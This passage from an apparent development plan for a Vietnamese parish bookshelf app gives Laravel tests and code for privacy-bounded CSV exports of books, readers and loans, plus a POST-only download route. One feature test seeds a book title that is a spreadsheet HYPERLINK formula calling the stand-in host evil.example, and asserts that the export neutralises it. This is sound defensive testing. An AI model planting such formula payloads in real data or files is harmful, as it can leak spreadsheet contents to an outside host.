        'void_reason' => 'bấm nhầm bản sách',
    ]);
    Loan::query()->create([
        'bookshelf_id' => $shelf->id, 'copy_id' => $dCopy->id, 'book_id' => $dBook->id,
        'borrower_id' => $child->id, 'lent_by' => $manager->id,
        'lent_at' => '2026-08-09 12:00:51', 'due_on' => '2026-08-23', 'status' => 'active',
    ]);

    // Foreign shelf: one of everything, names that would be visible if
    // scoping leaked.
    $fUser = User::factory()->create(['full_name' => 'Người Tủ Khác XPQ']);
    Membership::factory()->for($other)->create(['user_id' => $fUser->id, 'role' => 'reader', 'status' => 'active']);
    $fBook = Book::query()->create(['bookshelf_id' => $other->id, 'title' => 'Sách Tủ Khác XPQ', 'slug' => 'sach-khac-xpq']);
    $fCopy = BookCopy::query()->create(['bookshelf_id' => $other->id, 'book_id' => $fBook->id, 'code' => 'CT-0001', 'state' => 'available']);
    Loan::query()->create([
        'bookshelf_id' => $other->id, 'copy_id' => $fCopy->id, 'book_id' => $fBook->id,
        'borrower_id' => $fUser->id, 'lent_by' => $fUser->id,
        'lent_at' => '2026-08-05 04:00:00', 'due_on' => '2026-08-19', 'status' => 'active',
    ]);

    app(TenantContext::class)->set($shelf, $managerMembership);
    test()->actingAs($manager);

    return compact('shelf', 'child');
}

it('books: one row per COPY, folded alphabetical, this shelf only', function () {
    xpqFix();

    $rows = app(BooksExportQuery::class)->run();

    expect(array_column($rows, 'copyCode'))->toBe(['DT-0001', 'DT-0002'])   // Đất before Vừa
        ->and(array_column($rows, 'title'))->toBe(['Đất Rừng Phương Nam', 'Vừa Nhắm Mắt Vừa Mở Cửa Sổ'])
        ->and(array_column($rows, 'title'))->not->toContain('Sách Tủ Khác XPQ');
});

it('readers: the full manager-visible profile, and NEVER manager_notes', function () {
    xpqFix();

    $rows = app(ReadersExportQuery::class)->run();
    $child = collect($rows)->firstWhere('fullName', 'Đặng Thị Kim Chi');

    expect($child['phone'])->toBe('0912345678')
        ->and($child['fatherName'])->toBe('Đặng Văn Cha')
        // Prove the absence by the KEY, one assertion, then by the value
        // anywhere in the row — not a not->toHaveKeys bundle (inert).
        ->and(array_key_exists('managerNotes', $child))->toBeFalse()
        ->and(in_array('bố hay uống rượu, gọi mẹ', $child, true))->toBeFalse()
        // The credential pair is a boolean, never the values (INV-14).
        ->and($child['hasCredentials'])->toBeFalse()
        ->and(array_key_exists('username', $child))->toBeFalse()
        ->and(array_column($rows, 'fullName'))->not->toContain('Người Tủ Khác XPQ');
});

it('readers: joinedOn is the VN civil day — approved at 17:30 UTC files under the NEXT day', function () {
    xpqFix();

    $child = collect(app(ReadersExportQuery::class)->run())->firstWhere('fullName', 'Đặng Thị Kim Chi');

    expect($child['joinedOn'])->toBe('2026-08-10');   // NOT 2026-08-09
});

it('loans: complete history newest first, voided included with its reason as the note', function () {
    xpqFix();

    $rows = app(LoansExportQuery::class)->run();

    // The voided row was seeded FIRST and must come back SECOND — the
    // assertion is the reverse of creation order, so it can fail.
    expect($rows)->toHaveCount(2)
        ->and($rows[0]['status'])->toBe('active')
        ->and($rows[1]['status'])->toBe('voided')
        ->and($rows[1]['note'])->toBe('bấm nhầm bản sách')
        // The instant in the shelf's timezone, no offset suffix, no
        // fractional seconds — 12:00:51 UTC is 19:00:51 in VN.
        ->and($rows[0]['lentOn'])->toBe('2026-08-09 19:00:51')
        ->and(array_column($rows, 'title'))->not->toContain('Sách Tủ Khác XPQ');
});

it('the tables translate every enum to its shipped Vietnamese word', function () {
    xpqFix();

    $books = ExportTables::books(app(BooksExportQuery::class)->run());
    $loans = ExportTables::loans(app(LoansExportQuery::class)->run());
    $readers = ExportTables::readers(app(ReadersExportQuery::class)->run());

    expect($books['headers'][0])->toBe('Tên sách')
        ->and($books['rows'][0])->toContain('Đang cho mượn')      // on_loan
        ->and($books['rows'][1])->toContain('Cũ')                 // worn
        ->and($loans['rows'][1])->toContain('Đã huỷ')             // voided
        ->and($readers['rows'][0])->toContain('Đang hoạt động')   // active
        ->and($readers['rows'][0])->toContain('Không');           // hasCredentials
});

it('dates in the grid are ISO, numbers bare digits, null an empty cell', function () {
    // ISO because 02/04/2015 is April in Vietnam and February in a
    // US-locale Excel, silently; bare digits because vi-VN renders 2016
    // as "2.016", which a spreadsheet reads as two-point-oh-one-six; an
    // empty cell is what a spreadsheet means by "not recorded" — a dash
    // is a value that sorts and filters like one.
    xpqFix();

    $readers = ExportTables::readers(app(ReadersExportQuery::class)->run());
    $row = collect($readers['rows'])->first(fn ($r) => in_array('Đặng Thị Kim Chi', $r, true));

    expect($row)->toContain('2015-04-02')     // dateOfBirth, ISO
        ->and($row)->toContain('');           // email — empty cell, never "null"
});

it('the status and condition word sets match copy.ts verbatim', function () {
    $ts = file_get_contents(base_path('resources/js/lib/copy.ts'));
    $lang = require lang_path('vi/exports.php');

    foreach (array_merge($lang['condition'], $lang['membership_status']) as $key => $word) {
        expect($ts)->toContain("{$key}: \"{$word}\"");
    }
});
```

- [ ] **Step 3: Run to verify failure** — `make test FILTER=ExportQueriesTest` → FAIL.

- [ ] **Step 4: Implement the three queries**

`app/Queries/Exports/BooksExportQuery.php`:

```php
<?php

namespace App\Queries\Exports;

use App\Models\BookCopy;

/**
 * OPS §3.3's ExportBooksCSV — port of exports.ts's exportBooks. One row
 * per COPY, not per title: the file is insurance, and what a volunteer
 * rebuilding this shelf from a spreadsheet needs is every physical book
 * with its code, state and condition — which is also what makes it a
 * stocktaking sheet. Scoping is BookshelfScope's (both models carry the
 * trait); soft-deleted books and copies are excluded by SoftDeletes —
 * this file describes the shelf as it stands.
 *
 * Folded order (title_folded), id tiebreaks throughout: unpaged, so a
 * tie cannot lose a row — but two identical titles swapping places
 * between two exports of the same data is a diff a volunteer cannot
 * explain, and the key costs nothing.
 */
final class BooksExportQuery
{
    /** @return list<array<string, mixed>> */
    public function run(): array
    {
        $rows = BookCopy::query()
            ->join('books', 'books.id', '=', 'book_copies.book_id')
            ->whereNull('books.deleted_at')
            ->leftJoin('categories', function ($join) {
                $join->on('categories.id', '=', 'books.category_id')
                    ->whereNull('categories.deleted_at');
            })
            ->select('book_copies.*', 'books.title', 'books.author', 'books.publisher',
                'books.published_year', 'books.isbn', 'books.page_count', 'books.is_published',
                'categories.name as category_name')
            ->orderBy('books.title_folded')
            ->orderBy('books.id')
            ->orderBy('book_copies.code')
            ->orderBy('book_copies.id')
            ->get();

        return array_values($rows->map(fn (BookCopy $copy): array => [
            'title' => (string) $copy->getAttribute('title'),
            'author' => $copy->getAttribute('author'),
            'category' => $copy->getAttribute('category_name'),
            'publisher' => $copy->getAttribute('publisher'),
            'publishedYear' => $copy->getAttribute('published_year'),
            'isbn' => $copy->getAttribute('isbn'),
            'pageCount' => $copy->getAttribute('page_count'),
            'isPublished' => (bool) $copy->getAttribute('is_published'),
            'copyCode' => $copy->code,
            'state' => $copy->state->value,
            'condition' => $copy->condition?->value,
            'acquiredOn' => $copy->acquired_on?->toDateString(),
            'acquiredFrom' => $copy->acquired_from,
        ])->all());
    }
}
```

`app/Queries/Exports/ReadersExportQuery.php`:

```php
<?php

namespace App\Queries\Exports;

use App\Models\Membership;
use App\Queries\ParishContextQuery;
use App\Support\Members\ParishUnits;
use Carbon\CarbonImmutable;

/**
 * OPS §3.3's ExportReadersCSV — "a CSV of children is a disclosure
 * surface" (the reference's own heading). The column set is bounded by
 * BR §16.3's reader-detail page: nothing here that the screen does not
 * already show a manager.
 *
 * manager_notes is deliberately absent, and it is the column that
 * matters: BR §5.4 calls it the manager's PRIVATE notes, no screen
 * renders it — the day someone types "bố hay uống rượu, gọi mẹ" into
 * it, that sentence must not leave the system in a downloadable file.
 * ExportQueriesTest writes exactly that string into the column and
 * asserts it never reaches the row, so restoring the column argues with
 * a test, not a comment. username/password_hash are not here either:
 * hasCredentials is the boolean the reader-detail page substitutes
 * (INV-14), so the file answers "does this child have a way in from
 * home" without being a list of accounts to try.
 *
 * joinedOn is the CIVIL DAY in Asia/Ho_Chi_Minh: approved_at is a UTC
 * instant, and a bare date cast files everyone approved after 5pm local
 * under the previous day — a whole day wrong, in a column headed "Ngày
 * tham gia" (the reference measured it; the test pins 17:30 UTC → next
 * day).
 */
final class ReadersExportQuery
{
    public function __construct(private ParishContextQuery $parishContext) {}

    /** @return list<array<string, mixed>> */
    public function run(): array
    {
        $context = $this->parishContext->run();

        $rows = Membership::query()
            ->join('users', 'users.id', '=', 'memberships.user_id')
            ->whereNull('users.deleted_at')
            ->select('memberships.*', 'users.saint_name', 'users.full_name',
                'users.full_name_folded', 'users.date_of_birth', 'users.father_name',
                'users.mother_name', 'users.phone', 'users.email', 'users.username')
            ->orderBy('users.full_name_folded')
            ->orderBy('memberships.id')
            ->get();

        return array_values($rows->map(fn (Membership $m): array => [
            'saintName' => $m->getAttribute('saint_name'),
            'fullName' => (string) $m->getAttribute('full_name'),
            'dateOfBirth' => $m->getAttribute('date_of_birth'),
            'fatherName' => $m->getAttribute('father_name'),
            'motherName' => $m->getAttribute('mother_name'),
            'phone' => $m->getAttribute('phone'),
            'email' => $m->getAttribute('email'),
            'parishLine' => ParishUnits::describeSelection(
                $context['taxonomy'], $context['units'],
                $m->parish_unit_l1_id, $m->parish_unit_l2_id,
            ),
            'status' => $m->status->value,
            'role' => $m->role->value,
            'hasCredentials' => $m->getAttribute('username') !== null,
            'joinedOn' => $m->approved_at === null ? null
                : CarbonImmutable::parse($m->approved_at, 'UTC')
                    ->setTimezone('Asia/Ho_Chi_Minh')->toDateString(),
        ])->all());
    }
}
```

`app/Queries/Exports/LoansExportQuery.php`:

```php
<?php

namespace App\Queries\Exports;

use App\Models\Loan;
use Carbon\CarbonImmutable;

/**
 * OPS §3.3's ExportLoansCSV — every loan the shelf has ever recorded,
 * not the open ones. INV-11 is why "history" is load-bearing: loans are
 * never deleted, so this file is the complete circulation record, and a
 * filter to active would quietly make it something else. Voided rows
 * ride with their reason in the note column — BR §11's "why is there no
 * loan here" must have an answer six months later.
 *
 * lent_by/received_by resolve to names (an id is not readable); unlike
 * an audit sentence this is NOT history restated — loans is an ordinary
 * mutable table and the file describes it as it is now. The user joins
 * hang off loans rows the tenant scope already admitted.
 *
 * Instants render in the shelf's timezone with no offset suffix and no
 * fractional seconds: "2026-08-09 19:00:51", the one form every
 * spreadsheet parses identically (the reference shipped the bare ::text
 * first and a browser download caught 19:00 VN filed under 12:00 UTC —
 * and under the PREVIOUS DAY for anything lent after 5pm local).
 *
 * Order is newest first — a loan's identity is WHEN, and the volunteer
 * opening this file is looking for last week — with id desc closing the
 * tie two books handed over in one visit create.
 */
final class LoansExportQuery
{
    /** @return list<array<string, mixed>> */
    public function run(): array
    {
        $rows = Loan::query()
            ->join('books', 'books.id', '=', 'loans.book_id')
            ->join('book_copies', 'book_copies.id', '=', 'loans.copy_id')
            ->join('users as borrower', 'borrower.id', '=', 'loans.borrower_id')
            ->leftJoin('users as lender', 'lender.id', '=', 'loans.lent_by')
            ->leftJoin('users as receiver', 'receiver.id', '=', 'loans.received_by')
            ->select('loans.*', 'books.title', 'book_copies.code as copy_code',
                'borrower.full_name as borrower_name',
                'lender.full_name as lender_name', 'receiver.full_name as receiver_name')
            ->orderByDesc('loans.lent_at')
            ->orderByDesc('loans.id')
            ->get();

        return array_values($rows->map(fn (Loan $loan): array => [
            'title' => (string) $loan->getAttribute('title'),
            'copyCode' => (string) $loan->getAttribute('copy_code'),
            'borrowerName' => (string) $loan->getAttribute('borrower_name'),
            'lentOn' => self::instant($loan->lent_at),
            'dueOn' => $loan->due_on->toDateString(),
            'returnedOn' => self::instant($loan->returned_at),
            'status' => $loan->status->value,
            'returnCondition' => $loan->return_condition?->value,
            'lentBy' => $loan->getAttribute('lender_name'),
            'receivedBy' => $loan->getAttribute('receiver_name'),
            // One note column rather than three near-empty ones: a loan
            // carries at most one of these.
            'note' => $loan->return_note ?? $loan->void_reason,
        ])->all());
    }

    private static function instant(mixed $utc): ?string
    {
        return $utc === null ? null
            : CarbonImmutable::parse($utc, 'UTC')
                ->setTimezone('Asia/Ho_Chi_Minh')->format('Y-m-d H:i:s');
    }
}
```

Verify the attribute names against the models before trusting this transcription (`condition`/`return_condition` casts, `acquired_on` cast, `Loan::$casts` for `lent_at`) — the enums are cast on the models, hence the `->value` reads; if a column turns out uncast, drop the `?->value` for that field and read the string directly.

- [ ] **Step 5: Implement `ExportTables`**

`app/Support/Exports/ExportTables.php`:

```php
<?php

declare(strict_types=1);

namespace App\Support\Exports;

/**
 * The domain rows meet the words — port of old_next/src/lib/exports.ts.
 * Dates ISO (02/04/2015 is April in Vietnam and February in a US-locale
 * Excel, silently), numbers bare digits (vi-VN's "2.016" reads as
 * two-point-oh-one-six), null an EMPTY cell (a dash is a value that
 * sorts and filters like one), booleans "Có"/"Không" (TRUE displays in
 * English in a Vietnamese Excel).
 */
final class ExportTables
{
    /**
     * @param  list<array<string, mixed>>  $rows
     * @return array{headers: list<string>, rows: list<list<string>>}
     */
    public static function books(array $rows): array
    {
        $w = self::words();

        return [
            'headers' => $w['books_headers'],
            'rows' => array_map(fn (array $r): array => [
                (string) $r['title'],
                self::cell($r['author']),
                self::cell($r['category']),
                self::cell($r['publisher']),
                self::num($r['publishedYear']),
                self::cell($r['isbn']),
                self::num($r['pageCount']),
                $r['isPublished'] ? $w['yes'] : $w['no'],
                (string) $r['copyCode'],
                self::word($w['copy_state'], $r['state']),
                self::word($w['condition'], $r['condition']),
                self::cell($r['acquiredOn']),
                self::cell($r['acquiredFrom']),
            ], $rows),
        ];
    }

    /**
     * @param  list<array<string, mixed>>  $rows
     * @return array{headers: list<string>, rows: list<list<string>>}
     */
    public static function readers(array $rows): array
    {
        $w = self::words();

        return [
            'headers' => $w['readers_headers'],
            'rows' => array_map(fn (array $r): array => [
                self::cell($r['saintName']),
                (string) $r['fullName'],
                self::cell($r['dateOfBirth']),
                self::cell($r['fatherName']),
                self::cell($r['motherName']),
                self::cell($r['phone']),
                self::cell($r['email']),
                (string) $r['parishLine'],
                self::word($w['membership_status'], $r['status']),
                self::word($w['role'], $r['role']),
                $r['hasCredentials'] ? $w['yes'] : $w['no'],
                self::cell($r['joinedOn']),
            ], $rows),
        ];
    }

    /**
     * @param  list<array<string, mixed>>  $rows
     * @return array{headers: list<string>, rows: list<list<string>>}
     */
    public static function loans(array $rows): array
    {
        $w = self::words();

        return [
            'headers' => $w['loans_headers'],
            'rows' => array_map(fn (array $r): array => [
                (string) $r['title'],
                (string) $r['copyCode'],
                (string) $r['borrowerName'],
                self::cell($r['lentOn']),
                self::cell($r['dueOn']),
                self::cell($r['returnedOn']),
                self::word($w['loan_status'], $r['status']),
                self::word($w['condition'], $r['returnCondition']),
                self::cell($r['lentBy']),
                self::cell($r['receivedBy']),
                self::cell($r['note']),
            ], $rows),
        ];
    }

    private static function cell(mixed $value): string
    {
        return $value === null ? '' : (string) $value;
    }

    private static function num(mixed $value): string
    {
        return $value === null ? '' : (string) (int) $value;
    }

    /** @param array<string, string> $map */
    private static function word(array $map, mixed $key): string
    {
        return $key !== null && is_string($key) && array_key_exists($key, $map)
            ? $map[$key] : self::cell($key);
    }

    /** @return array<string, mixed> */
    private static function words(): array
    {
        static $words = null;

        return $words ??= require dirname(__DIR__, 3).'/lang/vi/exports.php';
    }
}
```

- [ ] **Step 6: Run** — `make test FILTER=ExportQueriesTest` → PASS.

- [ ] **Step 7: Lint, analyse, commit** — `make lint && make analyse`, commit as `feat: export queries and tables — bounded columns, vn civil days, complete history`.

---

### Task 9: The export route — POST, streamed, and the panel on the audit page

Read first: `old_next/src/app/tu-sach/[shelf]/quan-ly/xuat/[loai]/route.ts` **whole** — the POST-not-GET argument (§3.5(c): a file of children's records must not sit behind a URL "a shared parish phone keeps in its address bar"), the closed-map slug rule, the Cache-Control line, and the two-spellings filename.

**Files:**
- Create: `app/Http/Controllers/Manage/ExportController.php`
- Modify: `routes/web.php` (the `/exports/{kind}` line: GET under-construction → POST)
- Modify: `app/Http/Middleware/HandleInertiaRequests.php` (+ `csrfToken` shared prop)
- Modify: `resources/js/pages/manage/audit.tsx` (+ the export panel — three plain forms)
- Modify: `resources/js/lib/copy.ts` (+ `manageExports` namespace)
- Test: `tests/Feature/Oversight/ExportHttpTest.php`

**Interfaces:**
- Consumes: the three export queries + `ExportTables` (Task 8), `Csv` (Task 7), `Symfony\Component\HttpFoundation\HeaderUtils` (ships with Laravel).
- Produces: route `shelves.manage.exports.run` — `POST /shelves/{shelf}/manage/exports/{kind}`, `kind ∈ {books, readers, loans}`, streamed `text/csv; charset=utf-8`, `Cache-Control: no-store, private`; the audit page gains three download forms.

- [ ] **Step 1: Write the failing feature tests**

`tests/Feature/Oversight/ExportHttpTest.php`:

```php
<?php

use App\Models\Book;
use App\Models\BookCopy;
use App\Models\Bookshelf;
use App\Models\Membership;
use App\Models\User;
use App\Support\TenantContext;

/** Grep first: `grep -rn "^function xphFix" tests/`. */
function xphFix(): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => 'dong-thap-xph', 'name' => 'Tủ sách Đồng Tháp', 'settings' => []]);
    $manager = User::factory()->create(['full_name' => 'Maria Tải Tệp']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $manager->id, 'role' => 'manager', 'status' => 'active',
    ]);
    $reader = User::factory()->create(['full_name' => 'Anna Không Tải Được']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $reader->id, 'role' => 'reader', 'status' => 'active',
    ]);

    // A book whose title IS a formula, typed by a bored teenager with an
    // account: the end-to-end injection pin.
    $book = Book::query()->create([
        'bookshelf_id' => $shelf->id, 'slug' => 'sach-cong-thuc-xph',
        'title' => '=HYPERLINK("http://evil.example"&A2,"Bấm vào đây")',
    ]);
    BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $book->id, 'code' => 'DT-0001', 'state' => 'available']);

    return compact('shelf', 'manager', 'reader');
}

it('streams a BOM-led UTF-8 CSV to a manager, uncacheable, named twice', function () {
    $f = xphFix();

    $response = $this->actingAs($f['manager'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books");

    $response->assertOk()
        ->assertHeader('Content-Type', 'text/csv; charset=utf-8')
        ->assertHeader('Cache-Control', 'no-store, private');

    $disposition = $response->headers->get('Content-Disposition');
    expect($disposition)->toContain('attachment')
        ->toContain('books-dong-thap-xph-')          // ascii fallback
        ->toContain("filename*=utf-8''");            // RFC 6266, Vietnamese label

    $bytes = $response->streamedContent();
    expect(substr($bytes, 0, 3))->toBe("\xEF\xBB\xBF")          // the BOM, as bytes
        ->and(explode("\r\n", substr($bytes, 3))[0])->toStartWith('Tên sách');
});

it('neutralises a hostile stored title end to end', function () {
    $f = xphFix();

    $bytes = $this->actingAs($f['manager'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books")
        ->streamedContent();

    expect($bytes)->toContain('\'=HYPERLINK')          // apostrophe-neutralised…
        ->and($bytes)->not->toContain("\n=HYPERLINK"); // …never cell-leading
});

it('404s a reader; redirects a guest', function () {
    $f = xphFix();

    $this->actingAs($f['reader'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books")
        ->assertNotFound();
    $this->post("/shelves/{$f['shelf']->slug}/manage/exports/books")->assertRedirect();
});

it('an unknown kind — constructor included — is a 404, never a 500', function () {
    $f = xphFix();

    foreach (['audit', 'constructor', 'sach', '1'] as $kind) {
        $this->actingAs($f['manager'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/{$kind}")
            ->assertNotFound();
    }
});

it('GET is refused — a file of children\'s records is never a link', function () {
    $f = xphFix();

    $this->actingAs($f['manager'])
        ->get("/shelves/{$f['shelf']->slug}/manage/exports/readers")
        ->assertStatus(405);
});

it('readers and loans stream too, each with its own header row', function () {
    $f = xphFix();

    foreach (['readers' => 'Tên thánh', 'loans' => 'Tên sách'] as $kind => $firstHeader) {
        $bytes = $this->actingAs($f['manager'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/{$kind}")
            ->streamedContent();
        expect(explode("\r\n", substr($bytes, 3))[0])->toStartWith($firstHeader);
    }
});
```

- [ ] **Step 2: Run to verify failure** — `make test FILTER=ExportHttpTest` → FAIL (route is GET + under-construction).

- [ ] **Step 3: Implement controller and route**

`app/Http/Controllers/Manage/ExportController.php`:

```php
<?php

namespace App\Http\Controllers\Manage;

use App\Http\Controllers\Controller;
use App\Models\Bookshelf;
use App\Queries\Exports\BooksExportQuery;
use App\Queries\Exports\LoansExportQuery;
use App\Queries\Exports\ReadersExportQuery;
use App\Support\Clock;
use App\Support\Exports\Csv;
use App\Support\Exports\ExportTables;
use Symfony\Component\HttpFoundation\HeaderUtils;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * OPS §3.3's three CSV exports, one POST route. POST and never GET —
 * the reference's §3.5(c) argument holds unchanged: a GET is a link,
 * bookmarkable, in the history and the autocomplete of a shared parish
 * phone, and a browser will happily re-issue it; a form POST leaves
 * none of that behind. The reference's hand-rolled same-origin check is
 * NOT ported: Laravel's VerifyCsrfToken already refuses a cross-site
 * form post, properly, with a token instead of a Host-header
 * assumption.
 *
 * {kind} resolves through array_key_exists on a closed map — an unknown
 * segment (constructor included) is a 404, and nothing from the URL
 * reaches SQL.
 */
class ExportController extends Controller
{
    public function store(Bookshelf $shelf, string $kind, Clock $clock): StreamedResponse
    {
        /** @var array<string, array{label: string, table: callable(): array{headers: list<string>, rows: list<list<string>>}}> $kinds */
        $kinds = [
            'books' => ['label' => 'Sách',
                'table' => fn () => ExportTables::books(app(BooksExportQuery::class)->run())],
            'readers' => ['label' => 'Bạn đọc',
                'table' => fn () => ExportTables::readers(app(ReadersExportQuery::class)->run())],
            'loans' => ['label' => 'Lượt mượn',
                'table' => fn () => ExportTables::loans(app(LoansExportQuery::class)->run())],
        ];

        abort_unless(array_key_exists($kind, $kinds), 404);

        $date = $clock->today();
        $table = $kinds[$kind]['table']();

        return response()->stream(function () use ($table): void {
            echo Csv::BOM;
            echo Csv::line($table['headers']);
            foreach ($table['rows'] as $row) {
                echo Csv::line($row);
            }
        }, 200, [
            'Content-Type' => 'text/csv; charset=utf-8',
            // charset stated although the BOM already says so: the header
            // is what a saving browser reads; the BOM is what Excel reads
            // when the header is long gone in a Downloads folder.
            'Content-Disposition' => HeaderUtils::makeDisposition(
                HeaderUtils::DISPOSITION_ATTACHMENT,
                "{$kinds[$kind]['label']} — {$shelf->name} — {$date}.csv",
                "{$kind}-{$shelf->slug}-{$date}.csv",
            ),
            // A file of children's records is never cached, by the browser
            // or anything between it and here.
            'Cache-Control' => 'no-store, private',
        ]);
    }
}
```

In `routes/web.php`, replace the `/exports/{kind}` GET line (keep `/exports/qr-labels` above it — RouteOrderTest pins that order; add the import):

```php
        Route::get('/exports/qr-labels', [ShellController::class, 'underConstruction'])->name('exports.qr-labels');
        Route::post('/exports/{kind}', [ExportController::class, 'store'])->name('exports.run');
```

(The `exports.show` GET route is deleted — its only handler was `under-construction`, and divergence 7 refuses a GET on purpose. `bun run build` will catch any client `route('shelves.manage.exports.show', …)` reference; there are none.)

- [ ] **Step 4: Share the CSRF token and add the panel**

`app/Http/Middleware/HandleInertiaRequests.php` — add to the shared array:

```php
            // For the plain <form method="post"> downloads (an Inertia
            // router.post cannot receive a file): the token VerifyCsrfToken
            // will demand.
            'csrfToken' => $request->session()->token(),
```

`resources/js/lib/copy.ts`:

```ts
    manageExports: {
        heading: "Xuất dữ liệu",
        lead: "Tệp CSV mở được bằng Excel — sao lưu dữ liệu của tủ sách.",
        books: "Tải danh mục sách",
        readers: "Tải danh sách bạn đọc",
        loans: "Tải lịch sử mượn trả",
    },
```

In `resources/js/pages/manage/audit.tsx`, add `csrfToken` to `PageProps` (`csrfToken: string`) and render after the log list (the reference put the panel on this page for the same reason OPS lists the four operations on adjacent rows — both surfaces are about looking at what happened):

```tsx
            <section className="mt-10 rounded-lg border p-4">
                <h2 className="text-lg font-semibold">{copy.manageExports.heading}</h2>
                <p className="mb-3 text-sm text-muted-foreground">{copy.manageExports.lead}</p>
                <div className="flex flex-wrap gap-3">
                    {(
                        [
                            ["books", copy.manageExports.books],
                            ["readers", copy.manageExports.readers],
                            ["loans", copy.manageExports.loans],
                        ] as const
                    ).map(([kind, label]) => (
                        <form
                            key={kind}
                            method="post"
                            action={route("shelves.manage.exports.run", { shelf: shelf.slug, kind })}
                        >
                            <input type="hidden" name="_token" value={csrfToken} />
                            <button type="submit" className="rounded-md border px-4 py-2 text-sm">
                                {label}
                            </button>
                        </form>
                    ))}
                </div>
            </section>
```

(destructure `csrfToken` alongside the other props at the top of the component).

- [ ] **Step 5: Run** — `make test FILTER=ExportHttpTest` → PASS; `make test FILTER=AuditScreenTest` (the page changed) → PASS; `bun run build`; `bun run lint`.

- [ ] **Step 6: Lint, analyse, commit** — `make lint && make analyse`, commit as `feat: streamed csv exports — post-only, bom, neutralised, uncacheable`.

---

### Task 10: Wrap-up — the `loan.returned` amendment (if ruled), demo audit rows, the OPS walk, the durable record

This is the phase's Task-14-equivalent: nothing new is built; claims are verified against the shipped branch and written where the next phase will find them.

**Files:**
- Modify (conditional on open question 3's ruling): `app/Actions/Circulation/ReceiveReturn.php` + `tests/Feature/Circulation/ReceiveReturnTest.php` (or the 1c test file that pins the audit payload — locate with `grep -rln "loan.returned" tests/`)
- Modify: `database/seeders/DemoShelfSeeder.php` (a handful of audit rows so the demo audit page is not an empty state)
- Modify: `docs/known-gaps.md` (the Phase 1d durable record)
- Modify: this plan's `**Status:**` header

- [ ] **Step 1: The `loan.returned` `before.condition` amendment — ONLY if the product owner approved open question 3 (proposed: yes)**

In `app/Actions/Circulation/ReceiveReturn.php`, the audit call's `before` gains the copy's pre-return condition, read from the already-locked copy row (no new query, no lock change).

**Read the ordering before writing the line.** The existing `$copy->update(['state' => …, 'condition' => $condition, …])` (lines 87-91 on the shipped branch) runs BEFORE the `record()` call (line 93). Reading `$copy->condition` inside the audit call therefore yields the NEW condition, and the "one line" version of this amendment records `condition: "torn" → "torn"` with every test green — the exact shape of defect this phase exists to make visible. Capture first, then use the captured value:

```php
            // BEFORE the ConditionAssessment insert / $loan->update /
            // $copy->update block — right after the copy lock, while the
            // row still holds its pre-return value.
            $previousCondition = $copy->condition?->value;
```

```php
            $this->audit->record('loan.returned', 'loan', $loan->id,
                [
                    'status' => 'active',
                    'copy_state' => 'on_loan',
                    // Restored to the reference's shape (1d open question 3,
                    // owner-approved): the condition TRANSITION is what a
                    // damage-dispute investigation opens the expansion for.
                    // $previousCondition, NOT $copy->condition — the copy row
                    // was rewritten six lines up. Old rows lack the key and
                    // render an em dash, which is correct.
                    'condition' => $previousCondition,
                ],
                [
```

Extend the 1c test that asserts this payload (found via the grep above) so its `before` expectation carries the new key, and add one assertion that a copy going out `worn` and coming back `torn` records `before.condition = 'worn'` **and `after.condition = 'torn'` in the same expectation** — asserting only the `before` key's presence would pass against the broken `$copy->condition` spelling, which writes `'torn'` into both. Run that file. **If the owner ruled no: skip this step entirely and keep the known-gaps entry in Step 3 as the record.**

- [ ] **Step 2: Demo audit rows**

`DemoShelfSeeder` inserts models directly (no commands run), so a fresh demo's audit page is an empty state while its shelf visibly has books and loans — a screen that looks broken beside data that says otherwise.

**`TenancyArchitectureTest`'s tripwire scans `database_path()` as well as `app_path()`**, and its allowed list is `BookshelfScope`, `ResolveTenant` and (from Task 3) `AuditLogQuery` — nothing under `database/`. A literal `->where('bookshelf_id', …)` anywhere in `DemoShelfSeeder` therefore turns that suite red, which is why the shipped seeder uses relations and `firstOrCreate([...])` array keys throughout and names the rule in its own comment. Keep that discipline here: read the loan and the membership through the shelf's own relations, and give `Bookshelf` an `auditLogs()` relation for the guard.

Add to `app/Models/Bookshelf.php`, beside the existing `loans()`:

```php
    /** @return HasMany<AuditLog, $this> */
    public function auditLogs(): HasMany
    {
        return $this->hasMany(AuditLog::class);
    }
```

Then append, inside the seeder's system-wide block, after the loans are created (idempotent like the rest of the seeder — guard on an existing row):

```php
        if ($shelf->auditLogs()->doesntExist()) {
            $seededLoan = $shelf->loans()->first();
            AuditLog::query()->create([
                'bookshelf_id' => $shelf->id, 'actor_id' => $manager->id,
                'action' => 'loan.created', 'entity_type' => 'loan',
                'entity_id' => $seededLoan?->id,
                'before' => ['copy_state' => 'available'],
                'after' => $seededLoan === null ? null : [
                    'copy_state' => 'on_loan',
                    'borrower_id' => $seededLoan->borrower_id,
                    'due_on' => $seededLoan->due_on->toDateString(),
                    'title' => $seededLoan->book?->title,
                ],
                'context' => [],
            ]);
            AuditLog::query()->create([
                'bookshelf_id' => $shelf->id, 'actor_id' => $manager->id,
                'action' => 'membership.approved', 'entity_type' => 'membership',
                'entity_id' => $shelf->memberships()
                    ->where('role', 'reader')->where('status', 'active')->value('id'),
                'before' => ['status' => 'pending'], 'after' => ['status' => 'active'],
                'context' => [],
            ]);
        }
```

(add the `AuditLog` import; adapt the variable names to the seeder's own). Run `make test FILTER="SeederTest|TenancyArchitectureTest"` → PASS — the tenancy suite is named here on purpose: it is the one this step is most likely to break.

- [ ] **Step 3: The durable record in `docs/known-gaps.md`**

Append a `## Phase 1d — Oversight` section after the 1c block, written AFTER walking the shipped branch, not off this plan. It must contain, at minimum:

- **The OPS walk table** — the five implemented rows (`GetManagerDashboard` narrowed to two cards, `GetAuditLog` shelf-scoped, the three exports) and every exclusion with its owning phase exactly as this plan's header censuses them (statistics → Phase 2; profile-change queue and `GetShelfSettings` → Phase 3; §3.4 whole → Phase 3; notifications → Phase 2), each verified by opening the named file or route, not inferred.
- **The audit-action census as shipped** — 21 actions, the census test's location, and the rule it enforces (map entry and writer land in the same commit).
